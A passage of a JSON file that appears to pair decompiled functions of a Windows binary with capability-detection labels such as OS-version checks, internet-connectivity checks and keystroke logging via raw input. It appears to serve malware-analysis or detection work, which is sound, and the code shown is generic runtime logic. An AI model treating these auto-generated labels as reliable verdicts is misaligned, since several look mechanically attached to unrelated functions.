3;\n    fcn.0040af7c(arg_8h);\n    fcn.00405784();\n    *in_FS_OFFSET = arg_8h;\n    fcn.0040546c(0xbb0a);\n    return;\n}\n",
        "token_count": 408
    },
    "0048c978": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t * fcn.0048c978(void)\n\n{\n    uint32_t *in_EAX;\n    int32_t iVar1;\n    char *pcVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint arg_8h;\n    uint32_t *puStack100;\n    \n    iVar1 = sub.advapi32.dll_IsValidSid();\n    if (iVar1 != 0) {\n        pcVar2 = sub.advapi32.dll_GetSidIdentifierAuthority();\n        puVar3 = sub.advapi32.dll_GetSidSubAuthorityCount();\n        uVar5 = *puVar3;\n        uVar4 = uVar5 * 0xc + 0x1c;\n        if (uVar4 < *in_EAX || uVar4 == *in_EAX) {\n            fcn.0040aefc(0);\n            if ((*pcVar2 == '\\0') && (pcVar2[1] == '\\0')) {\n                arg_8h = 0;\n                fcn.0040a84c();\n                fcn.0040aefc(arg_8h);\n            }\n            else {\n                arg_8h = 5;\n                fcn.0040a84c();\n                fcn.0040aefc(arg_8h);\n            }\n            fcn.0040a84c();\n            do {\n                sub.advapi32.dll_GetSidSubAuthority();\n                fcn.0040aefc(arg_8h);\n                fcn.0040a84c();\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n            puStack100 = 0xffffffff;\n        }\n        else {\n            *in_EAX = uVar4;\n            sub.kernel32.dll_SetLastError(0x7a);\n            puStack100 = in_EAX;\n        }\n    }\n    return puStack100;\n}\n",
        "token_count": 421
    },
    "0048d448": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048d48f)\n\nvoid __fastcall fcn.0048d448(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 != '\\0') {\n        puStack44 = 0x48d45f;\n        in_EAX = fcn.00404964();\n    }\n    uStack48 = 0x48d4cb;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.0048d098();\n    fcn.00409af4();\n    *(in_EAX + 4) = 1;\n    fcn.0048d420();\n    fcn.004054c0();\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x48d4d2;\n    uStack48 = 0x48d4ca;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 275
    },
    "0048d500": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048d559)\n\nvoid fcn.0048d500(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x48d51c;\n    fcn.004058ec();\n    uStack36 = 0x48d591;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (*(in_EAX + 4) == 0) {\n        puStack32 = &stack0xfffffffc;\n        fcn.0048d098();\n    }\n    else {\n        puStack32 = &stack0xfffffffc;\n        fcn.0048d1e8();\n    }\n    fcn.00409af4();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x48d598;\n    uStack36 = 0x48d590;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 264
    },
    "0048e0ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048e0ac(void)\n\n{\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x48e11e;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar1 = *0x495918 == 0;\n    *0x495918 = *0x495918 + -1;\n    if (bVar1) {\n        fcn.0040520c();\n        fcn.00405234();\n        if (*0x4957f5 != '\\0') {\n            fcn.004054c0();\n        }\n        fcn.0040e16c();\n        fcn.00406f98();\n        fcn.0040e288();\n        fcn.0040f420();\n        fcn.0040eb40();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 233
    },
    "00402360": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00402360(uint param_1, uint8_t *param_2)\n\n{\n    int64_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    iVar1 = (in_EAX + 1) * 0x89705f41;\n    uVar3 = iVar1 >> 0x20;\n    uVar2 = uVar3 >> 0x1d;\n    uVar4 = (uVar3 & 0x1fffffff) * 5 + (iVar1 >> 0x1e);\n    *param_2 = iVar1 >> 0x3d | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar2 = uVar2 | uVar4 >> 0x1c;\n    *param_2 = uVar4 >> 0x1c | 0x30;\n    uVar3 = (uVar4 & 0xfffffff) * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = (uVar4 & 0xfffffff) * 5 & 0x7ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x1b;\n    *param_2 = uVar3 >> 0x1b | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0x3ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x1a;\n    *param_2 = uVar3 >> 0x1a | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0x1ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x19;\n    *param_2 = uVar3 >> 0x19 | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0xffffff;\n    uVar2 = uVar2 | uVar3 >> 0x18;\n    *param_2 = uVar3 >> 0x18 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x17;\n    uVar4 = uVar4 * 5 & 0x7fffff;\n    uVar2 = uVar2 | uVar3;\n    *param_2 = uVar3 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x16;\n    uVar4 = uVar4 * 5 & 0x3fffff;\n    uVar2 = uVar2 | uVar3;\n    *param_2 = uVar3 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x15;\n    *param_2 = uVar3 | 0x30;\n    param_2[(uVar2 | uVar3) != 0] = (uVar4 * 5 & 0x1fffff) * 5 >> 0x14 | 0x30;\n    return param_2 + ((uVar2 | uVar3) != 0) + 1;\n}\n",
        "token_count": 861
    },
    "00404a1c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00404a1c(void)\n\n{\n    if (1 < *0x490028) {\n        (**0x493014)(0xeedfadf, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "00404a74": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00404a74(void)\n\n{\n    uint in_EAX;\n    int32_t unaff_EBX;\n    uint uVar1;\n    uint auStack8 [2];\n    \n    if (1 < *0x490028) {\n        auStack8[0] = *(unaff_EBX + 4);\n        uVar1 = 0;\n        (**0x493014)(0xeedfae0, 0, 1, auStack8);\n        return uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 118
    },
    "00404a88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00404a88(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    if (1 < *0x490028) {\n        uVar1 = 0;\n        (**0x493014)(0xeedfae0, 0, 1, &stack0xfffffff8);\n        return uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 87
    },
    "00404abc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404abc(uint param_1, uint param_2)\n\n{\n    uint uStack16;\n    uint uStack8;\n    \n    if (1 < *0x490028) {\n        uStack16 = 0x404acd;\n        uStack8 = param_2;\n        fcn.00404a9c();\n        (**0x493014)(0xeedfae1, 0, 1, &stack0xfffffff0);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "00404ae4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404ae4(uint param_1, uint param_2)\n\n{\n    uint uStack4;\n    \n    if (1 < *0x490028) {\n        uStack4 = param_2;\n        (**0x493014)(0xeedfae2, 0, 1, &uStack4);\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00404b00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00404b00(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = param_2;\n    uStack4 = in_EAX;\n    if (1 < *0x490028) {\n        (**0x493014)(0xeedfae3, 0, 2, &uStack8);\n    }\n    return CONCAT44(uStack8, uStack4);\n}\n",
        "token_count": 111
    },
    "00405b8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405b8c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < param_2) {\n        iVar1 = *in_EAX;\n        if ((iVar1 != 0) && (*(iVar1 + -8) == 1)) {\n            fcn.00402f24();\n            *in_EAX = iVar1;\n            *(iVar1 + -4) = param_2;\n            *(param_2 + iVar1) = 0;\n            return;\n        }\n        iVar1 = fcn.00405530();\n        if (*in_EAX != 0) {\n            fcn.004030ec();\n        }\n    }\n    fcn.0040546c();\n    *in_EAX = iVar1;\n    return;\n}\n",
        "token_count": 195
    },
    "00405e78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405e78(uint arg_8h)\n\n{\n    fcn.00405de8();\n    fcn.00405d38();\n    return;\n}\n",
        "token_count": 40
    },
    "00407a14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407a14(uint lpMutexAttributes, int32_t arg_ch, uint bInitialOwner)\n\n{\n    sub.kernel32.dll_CreateMutexA(lpMutexAttributes, arg_ch != 0, bInitialOwner);\n    return;\n}\n",
        "token_count": 54
    },
    "0040a830": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0040a830(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.004058fc(0);\n    iVar2 = sub.kernel32.dll_CreateDirectoryA(uVar1);\n    return iVar2 != 0;\n}\n",
        "token_count": 64
    },
    "0040aafc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040aafc(uint32_t param_1)\n\n{\n    char cVar1;\n    uchar auStack53 [33];\n    uchar *puStack20;\n    uchar uStack16;\n    \n    puStack20 = auStack53 + 1;\n    if (0x1f < param_1) {\n        param_1 = 0x1f;\n    }\n    cVar1 = fcn.0040e49c();\n    if (cVar1 == '\\x01') {\n        param_1 = param_1 - 1;\n    }\n    fcn.0040a890();\n    auStack53[param_1 + 1] = 0;\n    uStack16 = 6;\n    fcn.00409730();\n    return;\n}\n",
        "token_count": 169
    },
    "0040b97c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nuchar __cdecl fcn.0040b97c(double *arg_8h)\n\n{\n    uint16_t *puVar1;\n    uint16_t in_AX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t in_CX;\n    int32_t iVar4;\n    uint16_t in_DX;\n    int32_t iVar5;\n    uint var_8h;\n    uchar var_3h;\n    uint var_2h;\n    \n    var_3h = 0;\n    uVar2 = fcn.0040b940();\n    iVar5 = (uVar2 & 0x7f) * 0x18;\n    if ((((in_AX != 0) && (in_AX < 10000)) && (in_DX != 0)) &&\n       (((in_DX < 0xd && (in_CX != 0)) && (puVar1 = iVar5 + 0x4907ee + in_DX * 2,  in_CX < *puVar1 || in_CX == *puVar1))\n       )) {\n        iVar3 = in_DX - 1;\n        if (0 < iVar3) {\n            iVar4 = 1;\n            do {\n                in_CX = in_CX + *(iVar5 + 0x4907ee + iVar4 * 2);\n                iVar4 = iVar4 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar3 = in_AX - 1;\n        iVar5 = iVar3;\n        if (iVar3 < 0) {\n            iVar5 = in_AX + 2;\n        }\n        *arg_8h = ((iVar3 * 0x16d + (iVar5 >> 2)) - iVar3 / 100) + iVar3 / 400 + in_CX + -0xa955a;\n        var_3h = 1;\n    }\n    return var_3h;\n}\n",
        "token_count": 442
    },
    "0040e288": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040e288(void)\n\n{\n    int32_t iVar1;\n    uint uStack148;\n    uint uStack144;\n    uint32_t uStack140;\n    int32_t iStack136;\n    \n    uStack148 = 0x94;\n    iVar1 = sub.kernel32.dll_GetVersionExA(&uStack148);\n    if (iVar1 != 0) {\n        *0x4907d8 = iStack136;\n        *0x4907dc = uStack148;\n        *0x4907e0 = uStack144;\n        if (iStack136 == 1) {\n            *0x4907e4 = uStack140 & 0xffff;\n        }\n        else {\n            *0x4907e4 = uStack140;\n        }\n        fcn.004056dc();\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "00410278": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00410278(uint arg_8h, int32_t arg_ch, uint noname_2, int16_t *arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack20 = &fcn.00410278::var_1h + 1;\n    uStack24 = 0x4102e5;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (arg_ch == 0x400) {\n        fcn.004056f4();\n        fcn.00409ffc();\n        *arg_14h = -(var_1h != '\\0');\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4102ec;\n    uStack24 = 0x4102e4;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 256
    },
    "004103dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004103dc(uint arg_8h, int32_t arg_ch, uint noname_2, uint *arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    uStack20 = 0x410440;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.0040a098();\n        fcn.00405dc8();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x410447;\n    uStack20 = 0x41043f;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 216
    },
    "00412fb8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412fb8(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x41306a;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    fcn.00415110();\n    uVar3 = var_4h;\n    iVar2 = (***0x49284c)(var_4h, 0x400, 0, &var_8h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004056f4();\n        cVar1 = fcn.00409ffc();\n        if (cVar1 == '\\0') {\n            fcn.00411244();\n        }\n    }\n    else if (iVar2 == 0) {\n        var_8h = var_8h & 0xffffff | 1 - (var_8h == 0) << 0x18;\n    }\n    else {\n        fcn.00411244();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.0040546c(0x413071);\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 355
    },
    "0041307c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0041307c(void)\n\n{\n    uchar *puStack24;\n    uchar auStack20 [16];\n    \n    puStack24 = auStack20;\n    sub.oleaut32.dll_VariantInit();\n    (***0x4929e8)(&puStack24);\n    fcn.00411244();\n    return 1;\n}\n",
        "token_count": 77
    },
    "00413120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00413120(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    uint uStack28;\n    \n    uVar1 = fcn.00416124();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(uStack28 + 0x1c))(0xb);\n        *param_2 = '\\x01' - (uStack28 == 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 138
    },
    "00415a24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415a24(uint param_1, char param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.0041156c();\n    }\n    *in_EAX = 0xb;\n    in_EAX[4] = -(param_2 != '\\0');\n    return;\n}\n",
        "token_count": 91
    },
    "00419ac0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00419ac0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x419ad2;\n    fcn.00419b48();\n    uStack20 = 0x419b3c;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0x20) != '\\x01') {\n        puStack16 = &stack0xfffffffc;\n        iVar1 = fcn.00419834();\n        if (iVar1 != -1) {\n            if (*(in_EAX + 0x20) == '\\x02') {\n                fcn.00419764();\n            }\n            goto code_r0x00419b26;\n        }\n    }\n    fcn.00419680();\ncode_r0x00419b26:\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x419b43;\n    uStack20 = 0x419b3b;\n    fcn.00419bac();\n    return;\n}\n",
        "token_count": 286
    },
    "0041fb68": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fb68(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if ((param_1 == '\\x01') && (param_2 != 0)) {\n        fcn.0041fb4c();\n    }\n    if (*(in_EAX + 0x10) != 0) {\n        iVar2 = *(*(in_EAX + 0x10) + 8) + -1;\n        while (-1 < iVar2) {\n            piVar1 = fcn.004197d8();\n            (**(*piVar1 + 0x10))();\n            iVar2 = iVar2 + -1;\n            if (*(*(in_EAX + 0x10) + 8) <= iVar2) {\n                iVar2 = *(*(in_EAX + 0x10) + 8) + -1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "00420f10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00420f10(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (in_EAX == 1) {\n        return 1;\n    }\n    if (in_EAX == 2) {\n        uVar1 = 2;\n    }\n    else if (in_EAX == 4) {\n        uVar1 = 3;\n    }\n    else if (in_EAX == 3) {\n        uVar1 = 4;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "004218dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid fcn.004218dc(void)\n\n{\n    int32_t arg_ch;\n    uchar *arg_8h;\n    uchar auStack20 [4];\n    \n    arg_8h = auStack20;\n    arg_ch = fcn.0042182c();\n    if (arg_ch < 1) {\n        fcn.0040546c();\n    }\n    else {\n        fcn.0040555c();\n        fcn.004058fc();\n        fcn.00421a64(arg_8h, arg_ch);\n        if ((arg_8h == '\\x01') || (arg_8h == '\\x02')) {\n            fcn.004058fc();\n            fcn.0040a84c();\n            fcn.00405b8c();\n        }\n        else {\n            fcn.00420ea0();\n        }\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "00423cdc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423cdc(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iStack108;\n    int32_t iStack104;\n    char cStack100;\n    char cStack99;\n    char cStack98;\n    uchar uStack97;\n    uint8_t uStack93;\n    \n    piVar2 = 0x490b64;\n    piVar3 = param_2;\n    for (iVar1 = 0xc; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *piVar3 = *piVar2;\n        piVar2 = piVar2 + 1;\n        piVar3 = piVar3 + 1;\n    }\n    if (in_EAX != 0) {\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if (iVar1 != 0) {\n            param_2[1] = in_EAX;\n            if (699 < iStack104) {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 1;\n            }\n            if (cStack100 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 2;\n            }\n            if (cStack99 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 4;\n            }\n            if (cStack98 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 8;\n            }\n            *(param_2 + 0xe) = uStack97;\n            fcn.004040f0();\n            fcn.00403964();\n            if ((uStack93 & 0xf) == 1) {\n                *(param_2 + 3) = 2;\n            }\n            else if ((uStack93 & 0xf) == 2) {\n                *(param_2 + 3) = 1;\n            }\n            else {\n                *(param_2 + 3) = 0;\n            }\n            *param_2 = in_EAX;\n            param_2[2] = iStack108;\n        }\n    }\n    return;\n}\n",
        "token_count": 529
    },
    "0042482c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042482c(void)\n\n{\n    fcn.00424794();\n    fcn.004247b0();\n    return;\n}\n",
        "token_count": 33
    },
    "00424948": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00424948(void)\n\n{\n    fcn.00424794();\n    fcn.004247b0();\n    return;\n}\n",
        "token_count": 32
    },
    "0042788c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
